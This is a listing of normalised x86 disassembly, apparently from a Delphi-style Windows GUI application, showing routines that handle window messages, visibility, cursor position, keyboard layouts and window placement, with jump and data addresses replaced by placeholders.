mov eax ebx
call sub_4464d0
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_433374
jmp r-xdata
sub_444974
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1a5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
mov al [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_441798
test bl bl
je r-xdata
mov eax edi
call sub_4467e0
mov eax edi
call sub_4463d8
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_4463d8
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_444a34
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_4413f4
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_444a84
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4467e0
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_442d58
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_4034e4
sub_444acc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x180 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov di [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_43f7f4
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_443d84
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45f428
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45d910
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov di [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
mov di [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_444c1c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_444cfb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444d02
lea eax [ ebp - 0x4 ]
call sub_404038
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
mov eax ebx
call sub_4464d0
mov dl [ ebx + 0x184 ]
call sub_44b0cc
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45d888
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_408064
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45d688
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
cmp [ ebx + 0x184 ] 0x0
je r-xdata
push 0x1
push esi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45d688
mov edx [ ebx + 0x188 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45d688
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
sub_444d08
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_444d92
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444d99
lea eax [ ebp - 0x4 ]
call sub_404038
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45d888
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_408064
test eax eax
je r-xdata
mov eax ebx
call sub_4464d0
mov dl 0x1
call sub_44b0b0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_444df4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dx [ ebp + 0x8 ]
mov eax edi
call sub_41612c
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_440e64
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_444e44
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_444e78
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_4034e4
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc3
call sub_4034e4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_444eb8
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_440e64
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_444f10
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_41d5a0
mov edx [ r-xdata ]
call sub_403498
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_444f48
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x178 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_417570
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_444f6c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_4464d0
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_444fc8
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_444f34
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_417570
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_445008
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x17c ]
call sub_405940
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x1f8 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_405940
jmp r-xdata
sub edx 0xffffff8c
cmp [ ebx + 0x1f8 ] 0x0
jne r-xdata
sub_445074
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_44511c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1a8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445123
lea eax [ ebp - 0x4 ]
call sub_405928
retn
mov [ edi + 0x1a8 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_43d95c
test bl bl
jne r-xdata
cmp [ edi + 0x178 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
call sub_4032e8
xor eax eax
mov [ edi + 0x178 ] eax
lea eax [ edi + 0x17c ]
call sub_405928
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc6
call sub_4034e4
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x17c ]
call sub_405940
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ edi + 0x178 ] eax
sub_44512c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_442d30
xor edx edx
push ebp
push sub_4451ee
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_4034e4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4451f5
mov eax [ ebp - 0x4 ]
call sub_442d38
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x58 ]
push edx
mov edx [ ebp - 0x8 ]
mov cl [ eax + 0x54 ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_4451f5
mov eax [ ebp - 0x4 ]
call sub_456c04
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_43ff10
sub_445240
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_403230
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_441b24
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_4452aa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_4034e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_43ff10
sub_4452c4
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_4452ec
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_456c04
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_456b0c
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbc
call sub_4034e4
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_4452ec
test al al
jne r-xdata
sub_445354
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4452ec
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_4475d8
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_445380
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4452ec
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_4475d8
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4453ac
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_4453d4
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_456c04
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_456b0c
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbb
call sub_4034e4
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_4453d4
test al al
jne r-xdata
sub_44543c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4453d4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44545c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4453d4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44549c
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_456c04
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
mov al [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffba
call sub_4034e4
xor eax eax
mov al [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_44549c
test al al
jne r-xdata
sub_445500
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44549c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_445520
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4431c8
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44318c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_440e64
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_445520
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_4455d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_445520
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov eax ebx
call sub_456c04
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_440e64
test eax eax
jne r-xdata
sub_445678
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_444118
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_445698
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov si [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_444118
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4456cc
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_444118
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4456ec
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
pop esi
retn
sub_44573c
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_445760
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
mov dl [ esp ]
mov eax ebp
call sub_43ef7c
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4431c8
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_44318c
mov dl [ esp ]
mov si 0xffd1
call sub_4034e4
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_4457b8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_4034e4
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_4457dc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_4034e4
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_445814
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_441938
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_443228
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_443a38
sub_44584c
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc2
call sub_4034e4
pop esi
pop ebx
retn
mov eax ebx
call sub_4402f4
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_4044f8
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_4044f8
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_4458cc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_443e18
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_441a0c
sub_44592c
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_443b8c
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_442f88
pop ebx
retn
sub_44595c
xor edx edx
mov dl [ eax + 0x1a6 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
retn
sub_445984
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_4467d4
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_442f88
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x180 ]
push eax
call EnableWindow
sub_4459f4
push ebx
mov ebx eax
mov eax ebx
call sub_441878
mov eax ebx
call sub_4467d4
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_443228
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_420480
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_440e64
sub_445a30
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_43e55c
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_4464d0
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_440e64
sub_445a70
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4467d4
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_4464d0
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_445ab0
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_443228
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_4467d4
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_4463d8
sub_445af0
push ebx
mov ebx eax
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x1a5 ]
mov eax ebx
call sub_446610
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_446610
jmp r-xdata
mov [ ebx + 0x1a9 ] 0x1
sub_445b50
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
mov al [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_4408c0
jmp r-xdata
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_43f7f4
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_443d84
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_445bc0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4419b0
mov edx esi
mov eax ebx
call sub_4431e8
pop esi
pop ebx
retn
sub_445bdc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
